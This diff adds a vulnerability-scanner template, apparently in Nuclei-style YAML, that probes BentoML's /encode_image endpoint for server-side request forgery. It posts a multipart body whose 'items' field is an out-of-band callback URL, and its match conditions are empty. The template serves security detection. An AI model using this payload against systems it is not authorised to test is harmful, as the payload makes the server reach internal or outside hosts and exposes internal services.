@@ -1,0 +1,25 @@
+id: bentoml-ssrf
+brief:
+    title: Bentoml - Server Side Request Forgery
+    by: ritikchaddha
+    level: critical
+    about: BentoML's upload file request is vulnerable to SSRF that allowing attacker to access internal service (local network).
+    label:
+        - ssrf
+        - bentoml
+        - oast
+        - oob
+    score: CVSS:8.3
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/encode_image'
+      head:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGqThdiCjrkRXHqIr
+      body: |-
+        ------WebKitFormBoundaryGqThdiCjrkRXHqIr
+        Content-Disposition: form-data; name="items";
+
+        http://{{interactsh-url}}/{{rand}}
+        ------WebKitFormBoundaryGqThdiCjrkRXHqIr--
+      signs: []
